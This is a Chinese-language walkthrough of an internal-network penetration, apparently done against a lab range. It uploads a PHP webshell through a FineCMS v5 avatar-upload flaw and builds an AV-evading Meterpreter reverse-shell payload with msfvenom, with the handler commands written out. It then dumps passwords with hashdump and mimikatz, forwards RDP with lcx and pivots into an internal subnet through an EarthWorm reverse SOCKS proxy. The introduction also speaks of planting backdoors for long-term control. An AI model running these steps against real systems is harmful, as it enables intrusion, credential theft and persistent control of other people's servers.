**前言**
  * 本次内网渗透的思路为：通过攻击外网服务器，从而获取外网服务器的权限，然后利用入侵成功的外网服务器作为跳板来攻击内网其他服务器，最后获得敏感数据（系统密码等），看情况安装后门木马或者后门软件，实现长期控制和获得敏感数据的方式。
  * 还有一种内网渗透的思路为：通过社工等方法攻击企业办公网的电脑、办公网无线等，实现控制办公电脑，再用获得的办公网数据。  
**一、利用FineCMS v5 的文件上传漏洞，获取官网系统的Webshell**  
**渗透过程详解**  
本次渗透过程将分为webshell—->getshell—->提权—->横向渗透  
webshell访问某网站，该网站利用的是FineCMS v5系统建站，创建一个新的用户进行测试。  
初步判断该网页模板为finecms v5建站系统，然后注册一个新的用户，方便我们利用finecms v5系统的文件上传漏洞  
参考链接：  
文件上传漏洞在会员头像处，所以先注册一个账号然后登录后上传我们的一句话木马  
最开始的文件格式是0x0.png  
通过burp代理拦截将tx后面的image/png换成image/php即可  
输入参数v=phpinfo();验证成功  
验证上传成功后，打开菜刀软件输入上传的网站路径和参数（一句话木马的密码），可以连接服务器  
在菜刀软件上可以进行数据库的提权，如mof提权、udf提权、启动项提权等  
**二、获取Win2008的远程桌面权限，并登陆administrator账号**  
编写免杀木马  
通过webshell连接目标服务器，但是访问的数据有限，仅仅是站点的系统账户权限，访问的系统路径也有限，于是我们可以编写免杀木马来进行反弹shell木马su.exe
        Msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.130 lport=4444 -f exe >/root/Desktop/su.exe
利用刚刚连接菜刀的操作，在文件管理中上传我们需要的工具  
进入meterpreter攻击模块，配置参数
  * use exploit/multi/handler
  * Set payload/windows/x64/meterpreter/reverse_tcp
  * Set lport 4444
  * Set lhost 192.168.10.130
  * run  
可以利用菜刀的虚拟终端模拟win2008服务器点击免杀木马的操作，让木马生效  
run执行监听  
获取密码过程
  * hashdump
  * load mimikatz
  * kerberos  
**注：如果win2008的远程桌面操作是不允许连接到这台计算机，那么开启端口转发也是没用的**  
开启远程桌面
        run getgui -e
**思路一：利用meterpreter模块执行远程连接**  
然后开启端口转发，-l（本地端口）-p（远程控制端口）-r（目标主机）  
靶机3389端口转发发送到本地的5555端口  
Rdesktop -u 用户名 -p 密码 127.0.0.1：5555 连接本地的5555端口开启远程桌面  
利用windows开启远程桌面，需要利用lcx工具，现在shell模式下输入指令  
靶机执行lcx.exe -slave 192.168.10.20 5555 192.168.10.10 3389  
**思路二：利用lcx工具执行远程连接**  
攻击机执行lcx.exe. -listen 5555 33891，接着打开mstsc连接127.0.0.1 ：33891  
以下为连接成功和监听数据的发送  
**三、获取内网Win7的远程桌面权限，并登陆到ndsec账号**  
在获取win2008服务器的meterpreter的基础上  
添加路由条目到10.10.10.0网段（run autoroute -s 10.10.10.0/24）  
扫描10.10.10.0/24网段下可能存在漏洞的主机，发现我们需要攻击的主机10.10.10.102（此操作需要在刚刚的meterpreter添加路由条目之后，不然会到达不了目标主机）  
尝试看看有没有Ms17-010漏洞，发现利用不成功，执行不起来  
没有shell这里就就没有用端口转发，做的是反向代理  
在攻击机执行
    ew.exe -s rcsocks -l 1080 -e 8888
在win2008shell下执行
    ew -s rssocks -d 192.168.10.20 -e 8888
代理建立成功  
接着用sockscap64工具添加ip和端口（反向代理）  
连接内网主机10.10.10.101  
输入密码ndsec登录  
**总结**  
不同的操作系统可能存在版本漏洞、中间件漏洞、组件漏洞、端口服务漏洞等，在渗透测试的过程中可以通过信息收集来获取思路。